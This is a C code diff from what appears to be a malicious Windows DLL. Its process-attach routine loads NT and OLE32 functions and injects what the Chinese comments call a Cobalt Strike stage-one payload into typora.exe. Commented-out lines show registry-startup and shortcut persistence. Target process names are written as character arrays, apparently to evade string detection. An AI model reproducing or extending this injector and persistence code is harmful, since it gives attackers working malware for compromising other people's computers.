@@ -679,6 +679,11 @@ static status_t custom_process_attach(HMODULE hModule)
 	{
 		return ST_ERROR;
 	}
+	ole32_functions_t ole32_funcs = { 0 };
+	if (!load_ole32_functions(&ole32_funcs))
+	{
+		return ST_ERROR;
+	}
 
 	sleaping_para.image_base = sac_dll_base;
 	sleaping_para.sac_dll_handle = sac_dll_handle;
@@ -686,15 +691,19 @@ static status_t custom_process_attach(HMODULE hModule)
 	sleaping_para.view_size = sac_dll_size;
 	sleaping_para.nt = &nt_funcs;
 
+
+	//if (create_shortcut(&ole32_funcs) != ST_SUCCESS)
+	//	return FALSE;
+	
 	// 修改注册表添加启动项
 	//if (add_to_startup() != ST_SUCCESS)
 	//	return FALSE;
 
 	// 向其他进程注入CS的一阶段载荷
 	// 拓展：可以让该DLL持久存在与进程中，并尝试向其他进程中注入各种恶意代码
-    WCHAR str_notepad[] = { 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', L'\0' };
+ //   WCHAR str_notepad[] = { 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', L'\0' };
     WCHAR str_typora[] = { 't', 'y', 'p', 'o', 'r', 'a', '.', 'e', 'x', 'e', L'\0' };
-	WCHAR str_explorer[] = { 'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e', L'\0' };
+	//WCHAR str_explorer[] = { 'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e', L'\0' };
 	inject(&nt_funcs, str_typora);
 
 
